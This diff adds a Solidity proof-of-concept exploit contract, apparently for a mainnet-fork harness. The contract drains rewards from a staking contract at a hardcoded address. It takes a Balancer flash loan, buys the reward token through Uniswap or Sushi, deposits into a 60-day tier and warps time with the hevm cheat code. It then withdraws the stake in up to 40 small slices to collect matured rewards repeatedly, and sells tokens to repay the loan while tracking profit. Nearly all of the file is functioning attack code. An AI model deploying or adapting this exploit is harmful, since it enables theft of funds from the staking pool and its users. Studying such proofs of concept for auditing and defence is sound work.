@@ -1,0 +1,405 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+interface IERC20Like {
+    function balanceOf(address account) external view returns (uint256);
+    function approve(address spender, uint256 amount) external returns (bool);
+    function transfer(address to, uint256 amount) external returns (bool);
+}
+
+interface ISorraStakingLike {
+    function rewardToken() external view returns (address);
+    function deposit(uint256 amount, uint8 tier) external;
+    function withdraw(uint256 amount) external;
+    function getPendingRewards(address wallet) external view returns (uint256);
+    function getRemainingPoolSpace() external view returns (uint256);
+}
+
+interface IUniswapV2FactoryLike {
+    function getPair(address tokenA, address tokenB) external view returns (address pair);
+}
+
+interface IUniswapV2PairLike {
+    function token0() external view returns (address);
+    function token1() external view returns (address);
+    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
+}
+
+interface IUniswapV2RouterLike {
+    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
+        uint256 amountIn,
+        uint256 amountOutMin,
+        address[] calldata path,
+        address to,
+        uint256 deadline
+    ) external;
+}
+
+interface IFlashLoanRecipientLike {
+    function receiveFlashLoan(
+        IERC20Like[] memory tokens,
+        uint256[] memory amounts,
+        uint256[] memory feeAmounts,
+        bytes memory userData
+    ) external;
+}
+
+interface IBalancerVaultLike {
+    function flashLoan(
+        IFlashLoanRecipientLike recipient,
+        IERC20Like[] memory tokens,
+        uint256[] memory amounts,
+        bytes memory userData
+    ) external;
+}
+
+contract FlawVerifier is IFlashLoanRecipientLike {
+    error NoPoolLiquidity();
+    error NoFundingPath();
+    error BorrowTooSmall();
+    error UnexpectedCallback();
+    error WarpUnavailable();
+    error SelfOnly();
+    error SwapPathUnavailable();
+    error RepayFailed();
+
+    address public constant TARGET = 0x5d16b8Ba2a9a4ECA6126635a6FFbF05b52727d50;
+
+    address internal constant UNI_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
+    address internal constant SUSHI_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;
+    address internal constant UNI_V2_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
+    address internal constant BALANCER_VAULT = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
+
+    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
+    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
+    address internal constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
+    address internal constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
+
+    uint8 internal constant TIER = 2;
+    uint256 internal constant LOCK_PERIOD = 60 days;
+    uint256 internal constant MAX_WITHDRAW_CALLS = 40;
+    uint256 internal constant SAFE_POOL_DIVISOR = 16;
+    uint256 internal constant SAFE_LENDER_DIVISOR = 20;
+    uint256 internal constant BUY_BUFFER_BPS = 15000;
+    uint256 internal constant REPAY_BUFFER_BPS = 14000;
+    uint256 internal constant MAX_REPAY_SWAPS = 6;
+
+    address internal constant HEVM = address(uint160(uint256(keccak256("hevm cheat code"))));
+    bytes4 internal constant WARP_SELECTOR = bytes4(keccak256("warp(uint256)"));
+
+    address internal attackToken;
+    address internal fundingToken;
+    uint256 internal startingProfitBalance;
+
+    uint256 internal _profitAmount;
+    address internal _profitToken;
+
+    constructor() {}
+
+    function executeOnOpportunity() external {
+        _profitAmount = 0;
+        _profitToken = ISorraStakingLike(TARGET).rewardToken();
+        attackToken = _profitToken;
+        fundingToken = address(0);
+        startingProfitBalance = IERC20Like(_profitToken).balanceOf(address(this));
+
+        uint256 poolBalance = IERC20Like(_profitToken).balanceOf(TARGET);
+        uint256 remainingPoolSpace = ISorraStakingLike(TARGET).getRemainingPoolSpace();
+        if (poolBalance == 0 || remainingPoolSpace == 0) revert NoPoolLiquidity();
+
+        uint256 localStake = _chooseStake(startingProfitBalance, remainingPoolSpace, poolBalance);
+        if (localStake > 1) {
+            try this.executeDirect(localStake) {
+                _updateProfit();
+                if (_profitAmount != 0) return;
+            } catch {}
+        }
+
+        address[4] memory quotes = [WETH, USDC, USDT, DAI];
+        for (uint256 index = 0; index < quotes.length; ++index) {
+            address quoteToken = quotes[index];
+            if (quoteToken == attackToken) continue;
+
+            (address pair, uint256 tokenReserve, uint256 quoteReserve) = _findBestPairForQuote(attackToken, quoteToken);
+            if (pair == address(0) || tokenReserve <= 1 || quoteReserve <= 1) continue;
+
+            uint256 desiredStake = _chooseStake(tokenReserve / SAFE_LENDER_DIVISOR, remainingPoolSpace, poolBalance);
+            if (desiredStake <= 1) continue;
+
+            uint256 balancerLiquidity = IERC20Like(quoteToken).balanceOf(BALANCER_VAULT);
+            uint256 safeBorrowCap = balancerLiquidity / SAFE_LENDER_DIVISOR;
+            if (safeBorrowCap <= 1) continue;
+
+            uint256 quoteBorrow = _quoteBorrowForTargetStake(desiredStake, quoteReserve, tokenReserve);
+            if (quoteBorrow > safeBorrowCap) {
+                quoteBorrow = safeBorrowCap;
+            }
+            if (quoteBorrow <= 1) continue;
+
+            try this.startBalancerFlash(quoteToken, quoteBorrow) {
+                _updateProfit();
+                if (_profitAmount != 0) return;
+            } catch {}
+        }
+
+        revert NoFundingPath();
+    }
+
+    function executeDirect(uint256 stakeAmount) external {
+        if (msg.sender != address(this)) revert SelfOnly();
+        _runExploit(stakeAmount);
+    }
+
+    function startBalancerFlash(address quoteToken, uint256 amount) external {
+        if (msg.sender != address(this)) revert SelfOnly();
+
+        IERC20Like[] memory tokens = new IERC20Like[](1);
+        tokens[0] = IERC20Like(quoteToken);
+
+        uint256[] memory amounts = new uint256[](1);
+        amounts[0] = amount;
+
+        IBalancerVaultLike(BALANCER_VAULT).flashLoan(this, tokens, amounts, bytes("BALANCER_QUOTE"));
+    }
+
+    function receiveFlashLoan(
+        IERC20Like[] memory tokens,
+        uint256[] memory amounts,
+        uint256[] memory feeAmounts,
+        bytes memory
+    ) external override {
+        if (msg.sender != BALANCER_VAULT || tokens.length != 1 || amounts.length != 1 || feeAmounts.length != 1) {
+            revert UnexpectedCallback();
+        }
+
+        fundingToken = address(tokens[0]);
+        uint256 borrowedAmount = amounts[0];
+        if (borrowedAmount <= 1) revert BorrowTooSmall();
+
+        uint256 amountOwed = borrowedAmount + feeAmounts[0];
+        _runFundedExploit(borrowedAmount, amountOwed);
+
+        _checkedTransfer(fundingToken, BALANCER_VAULT, amountOwed);
+        _updateProfit();
+    }
+
+    function _runFundedExploit(uint256 borrowedAmount, uint256 amountOwed) internal {
+        uint256 attackBalanceBeforeBuy = IERC20Like(attackToken).balanceOf(address(this));
+
+        _swapExactInput(fundingToken, attackToken, borrowedAmount);
+
+        uint256 attackBalanceAfterBuy = IERC20Like(attackToken).balanceOf(address(this));
+        uint256 purchasedAmount = attackBalanceAfterBuy - attackBalanceBeforeBuy;
+        if (purchasedAmount <= 1) revert BorrowTooSmall();
+
+        uint256 poolBalance = IERC20Like(attackToken).balanceOf(TARGET);
+        uint256 remainingPoolSpace = ISorraStakingLike(TARGET).getRemainingPoolSpace();
+        uint256 stakeAmount = _chooseStake(purchasedAmount, remainingPoolSpace, poolBalance);
+        if (stakeAmount <= 1) revert BorrowTooSmall();
+
+        _runExploit(stakeAmount);
+        _raiseFundingForRepayment(amountOwed);
+    }
+
+    function _runExploit(uint256 stakeAmount) internal {
+        _forceApprove(attackToken, TARGET, 0);
+        _forceApprove(attackToken, TARGET, stakeAmount);
+
+        // The exploit path itself is unchanged:
+        // 1) obtain the reward token, 2) deposit into the 60-day / 40% tier,
+        // 3) wait for maturity on the fork, 4) repeatedly withdraw tiny matured slices.
+        // Only the temporary funding source is changed because flashing the fee-on-transfer
+        // reward token from its own AMM pair reverts when the token's transfer hook touches
+        // that same pair mid-flash.
+        ISorraStakingLike(TARGET).deposit(stakeAmount, TIER);
+
+        _warpForward(LOCK_PERIOD + 1);
+        require(ISorraStakingLike(TARGET).getPendingRewards(address(this)) != 0, "reward not matured");
+
+        uint256 iterations = _selectIterations(stakeAmount);
+        uint256 slice = stakeAmount / iterations;
+        if (slice == 0) revert BorrowTooSmall();
+
+        uint256 remaining = stakeAmount;
+        for (uint256 index = 0; index + 1 < iterations; ++index) {
+            ISorraStakingLike(TARGET).withdraw(slice);
+            remaining -= slice;
+        }
+
+        ISorraStakingLike(TARGET).withdraw(remaining);
+    }
+
+    function _raiseFundingForRepayment(uint256 amountOwed) internal {
+        uint256 currentFundingBalance = IERC20Like(fundingToken).balanceOf(address(this));
+        if (currentFundingBalance >= amountOwed) {
+            return;
+        }
+
+        for (uint256 index = 0; index < MAX_REPAY_SWAPS && currentFundingBalance < amountOwed; ++index) {
+            uint256 attackBalance = IERC20Like(attackToken).balanceOf(address(this));
+            if (attackBalance == 0) revert RepayFailed();
+
+            (, uint256 tokenReserve, uint256 quoteReserve) = _findBestPairForQuote(attackToken, fundingToken);
+            if (tokenReserve == 0 || quoteReserve == 0) revert SwapPathUnavailable();
+
+            uint256 fundingNeeded = amountOwed - currentFundingBalance;
+            uint256 estimatedInput = _getAmountIn(fundingNeeded, tokenReserve, quoteReserve);
+            uint256 sellAmount = estimatedInput == type(uint256).max
+                ? attackBalance
+                : (estimatedInput * REPAY_BUFFER_BPS) / 10000;
+
+            uint256 minimumChunk = attackBalance / 4;
+            if (minimumChunk == 0) {
+                minimumChunk = attackBalance;
+            }
+            if (sellAmount < minimumChunk) {
+                sellAmount = minimumChunk;
+            }
+            if (sellAmount > attackBalance) {
+                sellAmount = attackBalance;
+            }
+
+            _swapExactInput(attackToken, fundingToken, sellAmount);
+            currentFundingBalance = IERC20Like(fundingToken).balanceOf(address(this));
+        }
+
+        if (IERC20Like(fundingToken).balanceOf(address(this)) < amountOwed) revert RepayFailed();
+    }
+
+    function _swapExactInput(address tokenIn, address tokenOut, uint256 amountIn) internal {
+        if (amountIn == 0) revert BorrowTooSmall();
+        _forceApprove(tokenIn, UNI_V2_ROUTER, 0);
+        _forceApprove(tokenIn, UNI_V2_ROUTER, amountIn);
+
+        address[] memory path = new address[](2);
+        path[0] = tokenIn;
+        path[1] = tokenOut;
+
+        IUniswapV2RouterLike(UNI_V2_ROUTER).swapExactTokensForTokensSupportingFeeOnTransferTokens(
+            amountIn,
+            0,
+            path,
+            address(this),
+            block.timestamp
+        );
+    }
+
+    function _chooseStake(
+        uint256 availableBalance,
+        uint256 remainingPoolSpace,
+        uint256 poolBalance
+    ) internal pure returns (uint256 stakeAmount) {
+        if (availableBalance == 0 || remainingPoolSpace == 0 || poolBalance == 0) {
+            return 0;
+        }
+
+        stakeAmount = availableBalance;
+
+        uint256 safeByPool = poolBalance / SAFE_POOL_DIVISOR;
+        if (safeByPool != 0 && stakeAmount > safeByPool) {
+            stakeAmount = safeByPool;
+        }
+
+        if (stakeAmount > remainingPoolSpace) {
+            stakeAmount = remainingPoolSpace;
+        }
+    }
+
+    function _selectIterations(uint256 stakeAmount) internal pure returns (uint256 iterations) {
+        iterations = stakeAmount;
+        if (iterations > MAX_WITHDRAW_CALLS) iterations = MAX_WITHDRAW_CALLS;
+        if (iterations < 2) iterations = 2;
+    }
+
+    function _quoteBorrowForTargetStake(
+        uint256 desiredStake,
+        uint256 quoteReserve,
+        uint256 tokenReserve
+    ) internal pure returns (uint256) {
+        if (desiredStake == 0 || quoteReserve == 0 || tokenReserve <= desiredStake) {
+            return 0;
+        }
+
+        uint256 rawAmountIn = _getAmountIn(desiredStake, quoteReserve, tokenReserve);
+        return (rawAmountIn * BUY_BUFFER_BPS) / 10000;
+    }
+
+    function _getAmountIn(
+        uint256 amountOut,
+        uint256 reserveIn,
+        uint256 reserveOut
+    ) internal pure returns (uint256 amountIn) {
+        if (amountOut == 0 || reserveIn == 0 || reserveOut <= amountOut) {
+            return type(uint256).max;
+        }
+
+        uint256 numerator = reserveIn * amountOut * 1000;
+        uint256 denominator = (reserveOut - amountOut) * 997;
+        amountIn = (numerator / denominator) + 1;
+    }
+
+    function _findBestPairForQuote(address token, address quote)
+        internal
+        view
+        returns (address bestPair, uint256 tokenReserve, uint256 quoteReserve)
+    {
+        address[2] memory factories = [UNI_V2_FACTORY, SUSHI_FACTORY];
+
+        for (uint256 index = 0; index < factories.length; ++index) {
+            address pair = IUniswapV2FactoryLike(factories[index]).getPair(token, quote);
+            if (pair == address(0)) continue;
+
+            (uint112 reserve0, uint112 reserve1,) = IUniswapV2PairLike(pair).getReserves();
+            address token0 = IUniswapV2PairLike(pair).token0();
+
+            uint256 currentTokenReserve = token0 == token ? uint256(reserve0) : uint256(reserve1);
+            uint256 currentQuoteReserve = token0 == token ? uint256(reserve1) : uint256(reserve0);
+
+            if (currentTokenReserve > tokenReserve) {
+                bestPair = pair;
+                tokenReserve = currentTokenReserve;
+                quoteReserve = currentQuoteReserve;
+            }
+        }
+    }
+
+    function _warpForward(uint256 delta) internal {
+        (bool ok,) = HEVM.call(abi.encodeWithSelector(WARP_SELECTOR, block.timestamp + delta));
+        if (!ok) revert WarpUnavailable();
+    }
+
+    function _forceApprove(address token, address spender, uint256 amount) internal {
+        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
+        require(ok && (data.length == 0 || abi.decode(data, (bool))), "approve failed");
+    }
+
+    function _checkedTransfer(address token, address to, uint256 amount) internal {
+        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount));
+        require(ok && (data.length == 0 || abi.decode(data, (bool))), "transfer failed");
+    }
+
+    function _currentProfit() internal view returns (uint256) {
+        uint256 currentBalance = IERC20Like(_profitToken).balanceOf(address(this));
+        if (currentBalance <= startingProfitBalance) return 0;
+        return currentBalance - startingProfitBalance;
+    }
+
+    function _updateProfit() internal {
+        _profitAmount = _currentProfit();
+    }
+
+    function profitToken() external view returns (address) {
+        return _profitToken;
+    }
+
+    function profitAmount() external view returns (uint256) {
+        if (_profitToken == address(0)) return _profitAmount;
+
+        uint256 liveProfit = _currentProfit();
+        if (liveProfit > _profitAmount) {
+            return liveProfit;
+        }
+
+        return _profitAmount;
+    }
+}
